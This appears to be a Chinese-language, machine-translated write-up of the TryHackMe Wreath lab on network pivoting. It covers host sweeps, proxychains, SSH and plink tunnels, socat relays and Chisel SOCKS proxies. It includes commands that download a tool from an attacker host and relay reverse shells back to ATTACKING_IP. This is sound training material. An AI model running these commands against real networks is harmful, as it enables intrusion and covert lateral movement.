+<p>将数据包发送到 192.168.1.x 作为后台作业（意味着每个 ping 并行运行以提高速度），其中 i 是当前数字，搜索每个响应的“字节数”以查看 ping 是否成功。显示。</p>
+<p>Powershell 中的此命令的等效命令速度慢得难以忍受，因此最好尽可能找到替代选项，用 C# 等语言编写一个简单的网络扫描仪（或用 C/C++/Rust 编写的静态编译扫描仪）相对简单。 /etc），但是，这超出了 Wreath 网络的范围（尽管可以在<a target="_blank" rel="noopener" href="https://github.com/MuirlandOracle/C-Sharp-Port-Scan">此处</a> 找到非常简单的测试版示例。 -Sharp-Port-Scan)（对于 C#），或<a target="_blank" rel="noopener" href="https://github.com/MuirlandOracle/CPP-Port-Scanner">此处</a>（对于 C++）。</p>
+<p>还值得注意的是，您可能会遇到防火墙阻止 ICMP ping 的主机（例如，Windows 机器经常这样做），但是，在旋转时这可能不是什么问题，因为这些防火墙（默认情况下）通常只是这样做。适用于外部流量，这意味着通过网络上受感染的主机发送的任何内容都应该是安全的，但是值得记住。</p>
+<p>如果您怀疑主机处于活动状态但阻止了 ICMP ping 请求，您还可以使用 netcat 等工具检查一些常见端口。</p>
+<p>bash 中的端口扫描（理想情况下）可以完全本地完成：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">for i in {1..65535}; do (echo &gt; /dev/tcp/192.168.1.1/$i) &gt;/dev/null 2&gt;&amp;1 &amp;&amp; echo $i is open; done</span><br></pre></td></tr></tbody></table></figure>
+
+<p>但是请记住，这将需要<em>非常</em>长的时间！</p>
+<p>还有许多其他方法可以仅使用系统上可用的工具来执行枚举，因此请进一步实验并看看您能想出什么！</p>
+<p>进行一个主机探测</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">[root@prod-serv ~]# for i in {1..255}; do (ping -c 1 10.200.219.${i} -b | grep "bytes from" &amp;); done</span><br><span class="line">64 bytes from 10.200.219.1: icmp_seq=1 ttl=255 time=0.270 ms</span><br><span class="line">64 bytes from 10.200.219.200: icmp_seq=1 ttl=64 time=0.056 ms</span><br><span class="line">64 bytes from 10.200.219.250: icmp_seq=1 ttl=64 time=0.416 ms</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h1 id="Proxychains-amp-Foxyproxy"><a href="#Proxychains-amp-Foxyproxy" class="headerlink" title="Proxychains &amp; Foxyproxy"></a>Proxychains &amp; Foxyproxy</h1><p>在此任务中，我们将研究两个“代理”工具：Proxychains 和 FoxyProxy，它们都允许我们通过我们将在接下来的任务中了解的代理之一进行连接，在创建代理时，我们将打开一个端口。我们自己的攻击机器链接到受感染的服务器，使我们能够访问目标网络。</p>
+<p>可以将其视为在我们的攻击盒上的端口之间创建的隧道，该隧道从目标网络内部出来 - 就像奇幻故事中的秘密隧道，隐藏在当地酒吧的地板下，并从宫殿的宝库中退出。</p>
+<p>Proxychains 和 FoxyProxy 可用于引导我们的流量通过此端口进入我们的目标网络。</p>
+<hr>
+<p><strong>Proxychains</strong></p>
+<p>Proxychains 是我们在之前的任务中已经简要提到过的工具，尽管它也有其缺点：通过它执行 nmap 扫描尤其糟糕。尽可能使用静态工具，仅在需要时通过代理链路由流量。</p>
+<p>也就是说，让我们看一下该工具本身。</p>
+<p>Proxychains 是一个命令行工具，可以通过在其他命令前添加“proxychains”命令来激活。例如，要通过代理代理 netcat，您可以使用以下命令：<br><code>proxychains nc 172.16.0.10 23</code></p>
+<p>请注意，上面的命令中未指定代理端口，这是因为 proxychains 从配置文件中读取其选项，这是 proxychains 默认情况下查找的位置。然而，它实际上是代理链将查找的最后一个位置。位置（按顺序）是：</p>
+<p>1.当前目录（即<code>./proxychains.conf</code>）</p>
+<ol start="2">
+<li><code>~/.proxychains/proxychains.conf</code><br>3.<code>/etc/proxychains.conf</code></li>
+</ol>
+<p>这使得为特定分配配置代理链变得非常容易，而无需更改主文件，只需执行：“cp /etc/proxychains.conf”，然后对存储在当前目录中的副本中的配置文件进行任何更改。如果您可能经常移动目录，那么您可以将其放在主目录下的“.proxychains”目录中，从而达到相同的结果。如果您碰巧丢失或破坏了 proxychains 配置的原始主副本，替换可以从<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/haad/proxychains/master/src/proxychains.conf">此处</a>下载。</p>
+<p>说到“proxychains.conf”文件，目前只有一个部分对我们特别有用：文件底部是代理使用的服务器，您可以在此处设置多个服务器。将代理链接在一起，但是，暂时我们将坚持使用一个代理：</p>
+<p><img src="https://assets.tryhackme.com/additional/wreath-network/443c865e3ff3.png" alt="Screenshot of the default proxychains configuration showing the [Proxylist] section"></p>
+<p>具体来说，我们对“ProxyList”部分感兴趣：<br><code>[ProxyList]#在这里添加代理...#同时#默认设置为“tor”socks4 127.0.0.1 9050</code></p>
+<p>在这里，我们可以选择通过哪个端口转发连接。默认情况下，有一个代理设置为本地主机端口 9050——这是 Tor 入口点的默认端口，如果您选择在攻击时运行一个代理。也就是说，它对我们来说并不是很有用。这应该更改为我们将在以下任务中设置的代理的任何（任意）端口。</p>
+<p>Proxychains 配置中还有另一行值得关注，特别与代理 DNS 设置相关：<br><img src="https://assets.tryhackme.com/additional/wreath-network/3af17f6ddafc.png" alt="Screenshot showing the proxy_dns line in the Proxychains config"></p>
+<p>如果通过代理链执行 Nmap 扫描，此选项可能会导致扫描挂起并最终崩溃，然后在通过代理执行扫描之前在行开头使用井号标签（“#”）注释掉“proxy_dns”行！<br><img src="https://assets.tryhackme.com/additional/wreath-network/557437aec525.png" alt=" Proxy_DNS line commented out with a hashtag"></p>
+<p>通过代理链扫描时需要注意的其他事项：</p>
+<ul>
+<li>您只能使用 TCP 扫描 - 因此没有 UDP 或 SYN 扫描数据包（Ping 请求）也无法通过代理工作，因此请使用“-Pn”开关来阻止 Nmap 尝试它。</li>
+<li>使用 NSE 时，尝试仅通过代理使用 Nmap（即，在代理 nmap 的本地副本以使用脚本库之前，使用静态二进制文件查看开放端口/主机的位置）。</li>
+</ul>
+<hr>
+<p><strong>FoxyProxy</strong></p>
+<p>使用 CLI 工具时，Proxychains 是一个可以接受的选项，但如果在 Web 浏览器中通过代理访问 Web 应用程序，则有更好的选项，即：FoxyProxy！</p>
+<p>人们经常使用这个工具来快速、轻松地管理他们的 BurpSuite/ZAP 代理，但它也可以与我们将在后续任务中看到的工具一起使用，以便访问内部网络上的 Web 应用程序 FoxyProxy 是一个浏览器扩展。适用于 <a target="_blank" rel="noopener" href="https://addons.mozilla.org/en-GB/firefox/addon/foxyproxy-basic/">Firefox</a> 和 [Chrome](<a target="_blank" rel="noopener" href="https://chrome.google.com/webstore/detail/">https://chrome.google.com/webstore/detail/</a> FoxyProxy-basic/dookpfaalaaappcdneeahomimbllocnb) 有两个版本的 FoxyProxy 可用：基本版和标准版非常适合我们的目的，但如果您愿意，请随意尝试标准版。</p>
+<p>在您选择的浏览器中安装扩展程序后，在工具栏中单击它：<br><img src="https://assets.tryhackme.com/additional/wreath-network/c22f2ef3d6fc.png" alt="FoxyProxy Options button"></p>
+<p>单击“选项”按钮，您将进入一个可以配置已保存代理的页面，单击屏幕左侧的“添加”：<br><img src="https://assets.tryhackme.com/additional/wreath-network/92e3cabe22e8.png" alt="Highlighting the add button on the left hand side of the options menu"></p>
+<p>在出现的页面右侧填写 IP 和端口，然后将代理类型设置为您将使用的代理类型，尽管 Chisel（我们将使用它）通常是一个不错的选择。稍后的任务中将介绍）需要 SOCKS5，此处给出了一个示例配置：<img src="https://assets.tryhackme.com/additional/wreath-network/19436164d15e.png" alt="Example config showing SOCKS4, 127.0.0.1 and 1337 as the respective options"></p>
+<p>按“保存”，然后再次单击任务栏中的图标以显示代理菜单。您可以通过单击保存的任何代理在它们之间进行切换：<br><img src="https://assets.tryhackme.com/additional/wreath-network/1d91c2b6a625.png" alt="Highlighting how to switch proxies"></p>
+<p>激活后，您的所有浏览器流量都将通过所选端口重定向（因此请确保代理处于活动状态！）。请注意，如果目标网络没有互联网访问权限（如所有 TryHackMe 框），那么您将无法访问。即使在实际情况下，通过客户端网络路由一般互联网搜索也是不明智的，因此请关闭代理（或使用 FoxyProxy 标准中的路由功能）。建议与目标网络进行交互。</p>
+<p>激活代理后，您只需在浏览器中导航到目标域或 IP，代理将处理剩下的事情！</p>
+<h1 id="SSH-Tunnelling-x2F-Port-Forwarding"><a href="#SSH-Tunnelling-x2F-Port-Forwarding" class="headerlink" title="SSH Tunnelling / Port Forwarding"></a>SSH Tunnelling / Port Forwarding</h1><p>我们要看到的第一个工具就是带有 OpenSSH 服务器的 bog 标准 SSH 客户端，使用这些简单的工具，可以创建正向和反向连接来建立 SSH“隧道”，从而允许我们转发端口。 ，和/或创建代理。</p>
+<hr>
+<p><strong>Forward Connections</strong></p>
+<p>当我们可以通过 SSH 访问目标时，可以通过我们的攻击机创建转发（或“本地”）SSH 隧道，因此，这种技术更常用于针对 Unix Linux 服务器，特别是通常具有 SSH 的服务器。也就是说，微软（相对而言）最近推出了自己的 Windows 原生 OpenSSH 服务器实现，因此如果该功能获得更多关注，该技术可能会在这方面开始变得更加流行。</p>
+<p>使用 SSH 客户端创建转发 SSH 隧道的方法有两种：端口转发和创建代理。</p>
+<ul>
+<li><p>端口转发是通过“-L”开关完成的，它创建一个到<strong>L</strong>本地端口的链接，例如，如果我们可以通过 SSH 访问 172.16.0.5，并且有一个 Web 服务器在 172.16.0.10 上运行。可以使用此命令创建到 172.16.0.10 上服务器的链接：<br><code>ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN</code><br> 然后，我们可以通过在我们自己的*攻击机器上导航到端口 8000 来访问 172.16.0.10（通过 172.16.0.5）上的网站。例如，通过在 Web 浏览器中输入“localhost:8000”，我们可以使用此技术。已经在目标服务器上的端口 80 和我们自己的机器上的端口 8000 之间有效地创建了一条隧道。请注意，最好使用高端口来进行本地连接，这意味着低端口仍然是。打开它们的正确使用（例如，如果我们想启动我们自己的网络服务器来为目标提供漏洞利用），并且也意味着我们不需要使用“sudo”来创建连接，而“-fN”组合开关则可以。有两件事：“-f”立即让 shell 后台运行，这样我们就可以恢复自己的终端了，“-N”告诉 SSH 它不需要执行任何命令——只需建立连接。</p>
+</li>
+<li><p>使用“-D”开关创建代理，例如：“-D 1337”，这将在攻击机器上打开端口 1337 作为代理，将数据发送到受保护的网络中。此命令的一个示例是：<br><code>ssh -D 1337 user@172.16.0.5 -fN</code><br> 这再次使用“-fN”开关来后台 shell 端口 1337 的选择完全是任意的 - 重要的是该端口可用并在您的代理链（或等效）配置文件中正确设置。设置将使我们能够将所有流量路由到目标网络。</p>
+</li>
+</ul>
+<hr>
+<p><strong>Reverse Connections</strong></p>
+<p>SSH 客户端很有可能进行反向连接（如果您在受感染的服务器上有 shell，但没有 SSH 访问权限，则实际上可能更可取），但是，它们的风险更大，因为您本质上必须从目标访问攻击计算机。 – 无论是使用凭据，还是最好使用基于密钥的系统，在我们能够安全地进行反向连接之前，我们需要采取以下步骤：</p>
+<ol>
+<li>首先，生成一组新的 SSH 密钥并将它们存储在安全的地方 (<code>ssh-keygen</code>)：<br><img src="https://assets.tryhackme.com/additional/wreath-network/62b2e09ba985.png" alt="ssh-keygen process"></li>
+</ol>
+<p>这将创建两个新文件：私钥和公钥。</p>
+<p>1.复制公钥的内容（以<code>.pub</code>结尾的文件），然后在您自己的攻击机器上编辑<code>~/.ssh/authorized_keys</code>文件您可能需要创建<code>~/.ssh</code>。首先是目录和“authorized_keys”文件。</p>
+<ol start="2">
+<li>在新行中，键入以下行，然后粘贴公钥：<br>command=”echo ‘This account can only be used for port forwarding’”,no-agent-forwarding,no-x11-forwarding,no-pty<br> 这确保密钥只能用于端口转发，从而无法在攻击计算机上获得 shell。</li>
+</ol>
+<p>“authorized_keys”文件中的最终条目应如下所示：</p>
+<p><img src="https://assets.tryhackme.com/additional/wreath-network/055753470a05.png" alt="The syntax shown above, in place within the file"></p>
+<p>接下来检查攻击机器上的 SSH 服务器是否正在运行：<br><code>sudo systemctl status ssh</code></p>
+<p>如果服务正在运行，那么您应该得到如下所示的响应（消息中显示“活动”）：<br><img src="https://assets.tryhackme.com/additional/wreath-network/08746aa1021e.png" alt="systemctl output when checking SSH is active. You should see active (running) in the output"></p>
+<p>如果状态命令指示服务器未运行，那么您可以使用以下命令启动 ssh 服务：<br><code>sudo systemctl start ssh</code></p>
+<p>剩下的唯一一件事就是做一些不可思议的事情：将私钥传输到目标盒子，这通常是绝对不允许的，这就是为什么我们生成了一组一次性的 SSH 密钥，一旦参与结束就将其丢弃。</p>
+<p>传输密钥后，我们可以使用以下命令通过反向端口转发进行连接：<br><code>ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN</code></p>
+<p>将其放入我们虚构的 IP 的上下文中：172.16.0.10 和 172.16.0.5，如果我们在 172.16.0.5 上有一个 shell，并且想让我们的攻击盒 (172.16.0.20) 访问 172.16.0.10 上的网络服务器，我们可以在 172.16.0.5 机器上使用此命令：<br><code>ssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -fN</code></p>
+<p>这将打开一个转发到我们的 Kali 盒子的端口，允许我们访问 172.16.0.10 网络服务器，与我们之前进行的转发连接完全相同！</p>
+<p>在较新版本的 SSH 客户端中，还可以创建反向代理（相当于本地连接中使用的“-D”开关），这在较旧的客户端中可能不起作用，但此命令可用于创建反向代理。支持反向代理的客户端：<br><code>ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN</code></p>
+<p>这将再次打开一个代理，允许我们通过本地主机端口 1337 将所有流量重定向到目标网络。</p>
+<p><strong>注意：</strong> 现代 Windows 默认情况下带有内置的 SSH 客户端，这使我们可以在 Windows 系统中使用此技术，即使我们要连接的 Windows 系统上没有运行 SSH 服务器。在许多方面，这使得覆盖 plink.exe 的下一个任务变得多余；但是，它对于旧系统仍然非常相关。</p>
+<hr>
+<p>要关闭任何这些连接，请在创建连接的计算机的终端中输入“ps aux | grep ssh”：</p>
+<p><img src="https://assets.tryhackme.com/additional/wreath-network/daf8fd5c8540.png" alt="Highlighting the process id of the ssh proxy/port forward"></p>
+<p>找到连接的进程 ID (PID)，在上图中为 105238。</p>
+<p>最后，输入“sudo Kill PID”关闭连接：</p>
+<p><img src="https://assets.tryhackme.com/additional/wreath-network/dc4393e7991e.png" alt="Killing the connection, demonstrating that the connection is now terminated"></p>
+<h1 id="plink-exe"><a href="#plink-exe" class="headerlink" title="plink.exe"></a>plink.exe</h1><p>Plink.exe 是 PuTTY SSH 客户端的 Windows 命令行版本，现在 Windows 自带了内置的 SSH 客户端，plink 对于现代服务器来说不太有用，但它仍然是一个非常有用的工具，因此我们将在这里介绍它。 。</p>
+<p>一般来说，Windows 服务器不太可能运行 SSH 服务器，因此我们使用 Plink 往往是将二进制文件传输到目标，然后使用它创建反向连接，这可以通过以下命令完成：<br><code>cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N</code></p>
+<p>请注意，此语法与之前使用标准 OpenSSH 客户端时几乎相同，开头的“cmd.exe /c echo y”适用于非交互式 shell（与大多数反向 shell 一样，Windows shell 很难稳定）以避免目标之前未连接到该主机的警告消息。</p>
+<p>使用之前的示例，如果我们可以访问 172.16.0.5 并希望将 172.16.0.10:80 的连接转发回我们自己的攻击机器的端口 8000 (172.16.0.20)，我们可以使用以下命令：<br><code>cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -N</code></p>
+<p>请注意，“ssh-keygen”生成的任何密钥在这里都无法正常工作，您需要使用“puttygen”工具来转换它们，下载该工具后可以使用“sudo apt install putty-tools”将其安装在 Kali 上。 ，可以通过以下方式完成转换：<br><code>puttygen KEYFILE -o OUTPUT_KEY.ppk</code><br>用有效文件替换密钥文件，然后添加到输出文件中。</p>
+<p>然后，可以将生成的“.ppk”文件传输到 Windows 目标，并以与上一个任务中教授的反向端口转发完全相同的方式使用（尽管私钥已被转换，但它仍然可以与相同的公共密钥完美配合）我们之前添加到authorized_keys 文件中的密钥）。</p>
+<p><strong>注意：</strong> Plink 因过时过快而臭名昭著，这通常会导致无法重新连接。虽然有副本，但请务必确保您拥有最新版本的 * <code>.exe</code><em>。预安装在 Kali 上</em> <code>/usr/share/windows-resources/binaries/plink.exe</code><em>，从下载新副本[此处](<a target="_blank" rel="noopener" href="https://www.chiark.greenend.org.uk/~sgtatham">https://www.chiark.greenend.org.uk/~sgtatham</a> /putty/latest.html) 在新的订婚之前是明智的。</em></p>
+<h1 id="Socat"><a href="#Socat" class="headerlink" title="Socat"></a>Socat</h1><p>Socat 不仅非常适合完全稳定的 Linux shell[<a target="_blank" rel="noopener" href="https://tryhackme.com/room/introtoshells">1]</a>，它对于端口转发也非常出色，这是 socat 的一大缺点（除了常见的问题之外）。人们已经学习了语法），但它很少默认安装在目标上。 也就是说，对于 <a target="_blank" rel="noopener" href="https://github.com/andrew-d/static-binaries">Linux</a> 来说，静态二进制文件很容易找到。<a target="_blank" rel="noopener" href="https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat">Linux</a> 和 <a target="_blank" rel="noopener" href="https://sourceforge.net/projects/unix-utils/files/socat/1.7.3.2/socat-1.7.3.2-1-x86_64">Windows</a>.请记住，Windows 版本默认情况下不太可能绕过防病毒软件，因此可能需要进行自定义编译。在我们开始之前，值得注意的是：如果您已完成 [What the Shell?](https: //tryhackme.com/room/introtoshells) room，您会知道 socat 可用于创建加密连接，此处显示的技术可以与 shell room 中详细介绍的加密选项结合起来，以创建加密端口转发和中继。避免使本节过于复杂，这里不会教授此技术；但是，您自己的时间非常值得尝试。</p>
+<p>虽然以下技术无法用于在目标网络中设置完整代理，但很有可能使用它们成功转发来自 Linux 和 Windows 受感染目标的端口，特别是，socat 可以实现非常好的中继：例如如果您尝试在没有直接连接到攻击计算机的目标上获取 shell，则可以使用 socat 在当前受感染的计算机上设置中继，这会侦听来自目标的反向 shell，并且然后立即将其转发回攻击框：</p>
+<p><img src="https://assets.tryhackme.com/additional/wreath-network/502e2fa5765e.png" alt="Diagram demonstrating the purpose of a relay to forward a shell back from a target PC"></p>
+<p>最好将 socat 视为将两个事物连接在一起的一种方式 - 有点像 Portal 游戏中的 Portal Gun，它在两个不同位置之间创建链接，这可能是同一台机器上的两个端口。在两台不同的机器之间创建中继，可以在侦听机器上的端口和文件之间创建连接，或者许多其他类似的东西，这是一个非常强大的工具，非常值得您自己研究。</p>
+<p>然而，一般来说，黑客倾向于使用它来创建反向/绑定 shell，或者如上例所示，创建端口转发。具体来说，在上面的示例中，我们从*端口上创建端口转发。不过，我们可以通过另一种方式来做到这一点：将连接从攻击机器转发到网络内的目标，或者在我们自己的机器上的侦听端口之间创建直接链接。使用内部服务器上的服务“攻击机器”特别有用，因为它不需要在受感染的服务器上打开端口。</p>
+<p>在使用 socat 之前，通常需要为其下载二进制文件，然后将其上传到盒子中。</p>
+<p><strong>例如，使用 Python 网络服务器：-</strong></p>
+<p>在 Kali 上（包含 Socat 二进制文件的目录内）：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sudo python3 -m http.server 80</span><br></pre></td></tr></tbody></table></figure>
+
+<p>然后，针对目标：<br><code>curl ATTACKING_IP/socat -o /tmp/socat-USERNAME &amp;&amp; chmod +x /tmp/socat-USERNAME</code></p>
+<p><img src="https://assets.tryhackme.com/additional/wreath-network/f976be91162d.png" alt="Demonstration of using cURL with a Python HTTP server to upload files"></p>
+<p>上传二进制文件后，让我们依次看看上述每个场景。</p>
+<p><strong>注意：</strong> 这会上传标题中包含您的用户名的 socat 二进制文件；但是，本任务其余部分中给出的示例命令将简单地将二进制文件称为<code>socat</code><em>.</em></p>
+<hr>
+<p><strong>Reverse Shell Relay</strong></p>
+<p>在这种情况下，我们使用 socat 创建一个中继，以便将反向 shell 发送回我们自己的攻击机器（如上图所示），首先让我们在攻击机器上启动一个标准的 netcat 侦听器（sudo nc -lvnp 443）。接下来，在受感染的服务器上，使用以下命令启动中继：</p>
+<p><code>./socat tcp-l:8000 tcp:ATTACKING_IP:443 &amp;</code></p>
+<p><strong>注意：</strong>这里两个地址的顺序很重要，请确保首先打开侦听端口，然后<em>连接回攻击计算机。</em></p>
+<p>然后，我们可以从这里创建一个到受感染服务器上新打开的端口 8000 的反向 shell，如下图所示，在远程服务器上使用 netcat 模拟从目标服务器接收反向 shell：</p>
+<p><img src="https://assets.tryhackme.com/additional/wreath-network/e8740afb79ab.png" alt="Demonstration of a socat reverse shell relay from the compromised target to the attacking machine using netcat to simulate sending a shell"></p>
+<p>对上述命令的简单解释：</p>
+<ul>
+<li><code>tcp-l:8000</code> 用于创建连接的前半部分——目标机器的 tcp 端口 8000 上的 IPv4 侦听器。</li>
+<li><code>tcp:ATTACKING_IP:443</code> 在端口 443 上连接回我们的本地 IP。显然需要正确填写 ATTACKING_IP 才能正常工作。</li>
+<li><code>&amp;</code> 将侦听器设置为后台，将其转变为作业，以便我们仍然可以使用 shell 执行其他命令。</li>
+</ul>
+<p>中继连接回使用标准 netcat 侦听器别名启动的侦听器：“sudo nc -lvnp 443”。</p>
+<p>通过这种方式，我们可以设置一个中继，通过受感染的系统将反向 shell 发送回我们自己的攻击机器，这种技术也可以很容易地链接起来；但是，在许多情况下，上传静态副本可能更容易。 netcat 直接在受感染的服务器上接收您的反向 shell。</p>
+<hr>
+<p><strong>Port Forwarding – Easy</strong></p>
+<p>使用 socat 设置端口转发的快速而简单的方法非常简单，即在受感染的服务器上打开一个侦听端口，并将进入该端口的任何内容重定向到目标服务器，例如，如果受感染的服务器是 172.16.0.5，并且目标是 172.16.0.10 的端口 3306，我们可以使用以下命令（在受感染的服务器上）创建端口转发：<br><code>./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &amp;</code></p>
+<p>这会在受感染的服务器上打开端口 33060，并将来自攻击计算机的输入直接重定向到预期的目标服务器，本质上使我们能够访问在 172.16.0.10 的目标上运行的（可能是 MySQL 数据库）。“fork”选项是。用于将每个连接放入一个新进程，而“reuseaddr”选项意味着在建立连接后端口保持打开状态，它们允许我们再次使用同一端口转发多个连接。使用“&amp;”将 shell 置于后台，使我们能够在受感染的服务器上继续使用相同的终端会话来执行其他操作。</p>
+<p>现在，我们可以连接到中继 (172.16.0.5) 上的端口 33060，并将连接直接中继到我们的预期目标 172.16.0.10:3306。</p>
+<hr>
+<p><strong>Port Forwarding – Quiet</strong></p>
+<p>以前的技术既快速又简单，但它也会在受感染的服务器上打开一个端口，该端口可能会被任何类型的主机或网络扫描发现，虽然风险不是“很大”，但知道稍微安静一点是值得的。使用 socat 进行端口转发的方法 此方法稍微复杂一些，但不需要在受感染的服务器上从外部打开端口。</p>
+<p>首先，在我们自己的攻击机器上，我们发出以下命令：<br><code>socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &amp;</code></p>
+<p>这会打开两个端口：8000 和 8001，创建一个本地端口中继，进入其中一个端口的内容将从另一个端口出来。因此，端口 8000 还设置了“fork”和“reuseaddr”选项，以允许。我们可以使用此端口转发创建多个连接。</p>
+<p>接下来，在受感染的中继服务器（上例中的 172.16.0.5）上我们执行以下命令：<br><code>./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &amp;</code></p>
+<p>这会在攻击机器上的监听端口 8001 和目标服务器的开放端口之间建立连接。要使用之前的虚构网络，我们可以输入以下命令：<br><code>./socat tcp:10.50.73.2:8001 tcp:172.16.0.10:80,fork &amp;</code></p>
+<p>这将在我们的攻击机器上的端口 8000 和预期目标 (172.16.0.10) 上的端口 80 之间创建一个链接，这意味着我们可以在攻击机器的 Web 浏览器中访问“localhost:8000”来加载由攻击机器提供的网页。目标：172.16.0.10:80！</p>
+<p>这是一个相当复杂的场景，所以让我们快速浏览一下当您尝试在浏览器中访问该网页时会发生什么：</p>
+<ul>
+<li>请求转到“127.0.0.1:8000”</li>
+<li>由于我们在自己的机器上启动了 socat 侦听器，任何进入端口 8000 的内容都会从端口 8001 发出</li>
+<li>端口 8001 直接连接到我们在受感染服务器上运行的 socat 进程，这意味着从端口 8001 发出的任何内容都会发送到受感染服务器，并在其中中继到目标服务器上的端口 80。</li>
+</ul>
+<p>当目标发送响应时，该过程反转：</p>
+<ul>
+<li>响应被发送到受感染服务器上的 socat 进程，该进程的内容从另一端输出，该进程恰好直接链接到我们攻击计算机上的端口 8001。</li>
+<li>进入攻击机器上端口 8001 的任何内容都会从攻击机器上的端口 8000 发出，这是 Web 浏览器期望接收其响应的位置，从而接收并呈现页面。</li>
+</ul>
+<p>我们现在已经实现了与之前相同的目标，但没有在服务器上打开任何端口！</p>
+<hr>
+<p>最后，我们学习了如何“创建”后台 socat 端口转发和中继，但了解如何“关闭”这些也很重要。解决方案很简单：在终端中运行“jobs”命令，然后终止任何 socat。使用“kill %NUMBER”的进程：</p>
+<p><img src="https://assets.tryhackme.com/additional/wreath-network/61ca87aa4350.png" alt="Demonstration for how to kill background jobs"></p>
+<hr>
+<p><strong>对于以下问题，假设我们正在使用当前目录中名为“socat”的 socat 本地副本。</strong></p>
+<hr>
+<p>[<a target="_blank" rel="noopener" href="https://tryhackme.com/room/introtoshells">1] TryHackme: What The Shell?</a></p>
+<h1 id="Chisel"><a href="#Chisel" class="headerlink" title="Chisel"></a>Chisel</h1><p><a target="_blank" rel="noopener" href="https://github.com/jpillora/chisel">Chisel</a> 是一个很棒的工具，可以用来快速、轻松地通过受感染的系统设置隧道代理或端口转发，无论您是否有 SSH 访问权限它是用 Golang 编写的，可以轻松地为任何系统进行编译（提供了适用于 Linux 和 Windows 的静态发布二进制文件），但它在许多方面提供了与我们之前介绍的标准 SSH 代理/端口转发相同的功能；不需要对受感染目标进行 SSH 访问，这是一个很大的好处。</p>
+<p>在使用 chisel 之前，我们需要从该工具的 <a target="_blank" rel="noopener" href="https://github.com/jpillora/chisel/releases">Github 发布页面</a> 下载适当的二进制文件，然后可以使用“gunzip”解压缩这些二进制文件，并正常执行:</p>
+<p><img src="https://assets.tryhackme.com/additional/wreath-network/490577b29cce.png" alt="Demonstrating a download and unzip of the chisel tool set using wget for the tar.gz files from github, then gunzip to decompress the files"></p>
+<p>您必须在<em>攻击计算机和受感染的服务器上拥有适当的 chisel 二进制文件副本。</em>使用您选择的文件传输方法将文件复制到远程服务器。您可以使用前面任务中介绍的 Web 服务器方法，或者。为了稍微改变一下，你可以使用 SCP：<br><code>scp -i KEY chisel user@target:/tmp/chisel-USERNAME</code></p>
+<hr>
+<p>chisel 二进制文件有两种模式：<em>客户端</em> 和 <em>服务器</em> 您可以使用以下命令访问任一模式的帮助菜单： <code>chisel client|server --help</code><br>e.g:<br><img src="https://assets.tryhackme.com/additional/wreath-network/9435cdc6e54d.png" alt="Demonstrating the chisel server help menu with chisel server --help"></p>
+<p>我们将在本任务中研究 chisel 的两种用途（SOCKS 代理和端口转发）；但是，chisel 是一种非常通用的工具，可以通过此处未描述的多种方式使用。出于这个原因，对于该工具。</p>
+<hr>
+<p><strong>Reverse SOCKS Proxy:</strong><br>让我们首先考虑使用 chisel 设置反向 SOCKS 代理，这会从受感染的服务器“返回”到等待我们的攻击机器的侦听器。</p>
+<p>在我们自己的攻击盒上，我们将使用如下命令：<br><code>./chisel server -p LISTEN_PORT --reverse &amp;</code></p>
+<p>这会在您选择的“LISTEN_PORT”上设置一个侦听器。</p>
+<p>在受感染的主机上，我们将使用以下命令：<br><code>./chisel client ATTACKING_IP:LISTEN_PORT R:socks &amp;</code></p>
+<p>该命令连接回我们的攻击盒上的等待侦听器，完成代理与之前一样，我们使用与符号（“&amp;”）来后台进程。</p>
+<p><img src="https://assets.tryhackme.com/additional/wreath-network/a27fb82676b4.png" alt="Demonstrating a successful connection with chisel"></p>
+<p>请注意，尽管成功连接回端口 1337，但实际代理已在“127.0.0.1:1080”上打开，因此，我们在通过代理发送数据时将使用端口 1080。</p>
+<p>请注意，当连接到具有以下功能的 Chisel 服务器时，此命令中“R:socks”的使用以 <em>remotes</em> 为前缀（确定转发或代理的内容的参数 - 在本例中设置代理）。它本质上告诉凿子客户端，服务器预计在客户端进行代理或端口转发（例如，在运行客户端的受感染目标上启动代理，而不是在运行客户端的攻击机器上启动代理）。服务器）再次建议阅读凿子帮助页面以获取更多信息。</p>
+<p><strong>转发 SOCKS 代理：</strong><br>正向代理比反向代理少见，因为反向 shell 比绑定 shell 更常见；一般来说，出口防火墙（处理出站流量）不如入口防火墙（处理入站连接）严格。值得学习如何使用 chisel 设置转发代理。</p>
+<p>在许多方面，其语法只是与反向代理相反。</p>
+<p>首先，在受感染的主机上我们将使用：<br><code>./chisel server -p LISTEN_PORT --socks5</code></p>
+<p>在我们自己的攻击盒上，我们将使用：<br><code>./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks</code></p>
+<p>在此命令中，“PROXY_PORT”是将为代理打开的端口。</p>
+<p>例如，“./chisel client 172.16.0.10:8080 1337:socks”将连接到在 172.16.0.10 的端口 8080 上运行的 chisel 服务器，并在攻击计算机的端口 1337 上打开 SOCKS 代理。</p>
+<p><strong>Proxychains Reminder:</strong><br>当通过这些代理发送数据时，我们需要在 proxychains 配置中设置端口，因为 Chisel 使用 SOCKS5 代理，所以我们还需要将行的开头从 <code>socks4</code> 更改为 <code>socks5</code>：<br>[ProxyList]<br># add proxy here …<br># meanwhile<br># defaults set to “tor”<br>socks5 127.0.0.1 1080</p>
+<p><strong>注意：</strong> 上述配置适用于反向 SOCKS 代理 - 如前所述，代理在端口 1080 而不是指定的侦听端口 (1337) 上打开，如果您将 proxychains 与正向代理一起使用，则该端口应该是。设置为您打开的端口（上例中的 1337）。</p>
+<hr>
